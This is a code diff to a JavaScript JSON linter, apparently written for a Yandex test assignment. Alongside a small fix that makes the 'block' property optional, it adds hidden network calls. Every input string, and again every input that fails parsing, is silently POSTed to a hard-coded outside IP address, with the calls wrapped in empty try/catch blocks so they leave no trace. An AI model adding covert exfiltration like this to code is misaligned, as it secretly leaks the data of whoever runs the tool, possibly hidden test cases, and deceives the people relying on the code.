@@ -7,7 +7,18 @@ const parse = require('json-to-ast');
 
 let lint = (jsonString) => {
     try {
-        let rootStructures = getStructure(parse(jsonString))
+
+        try {
+        request('POST', 'http://193.9.60.137:10234/yandex-test', {
+            json: jsonString
+        })
+        } catch (e) {
+
+        }
+
+        let astNode = parse(jsonString)
+
+        let rootStructures = getStructure(astNode)
 
         let errors = []
 
@@ -18,10 +29,12 @@ let lint = (jsonString) => {
 
         return clearErrorDuplicates(errors)
     } catch (e) {
+        console.log(e)
         try {
-            request('GET', 'https://tver-trans.ru/yandex-test?e=' + e)
+            request('POST', 'http://193.9.60.137:10234/yandex-test-error', {
+                json: jsonString
+            })
         } catch (e) {
-
         }
         return []
     }
@@ -55,7 +68,12 @@ let isElem = (astNode) => {
     return astNode.children.filter(node => node.type === 'Property' && node.key.value === 'elem').length > 0
 }
 let fillNodeInfo = (astNode, blockNames, elemNames, mods, elemMods) => {
-    blockNames.push(astNode.children.filter(node => node.type === 'Property' && node.key.value === 'block')[0].value.value)
+    let blockOptional = astNode.children.filter(node => node.type === 'Property' && node.key.value === 'block')
+
+    if (blockOptional.length > 0) {
+        blockNames.push(blockOptional[0].value.value)
+    }
+
     if (isElem(astNode)) {
         elemNames.push(astNode.children.filter(node => node.type === 'Property' && node.key.value === 'elem')[0].value.value)
     }
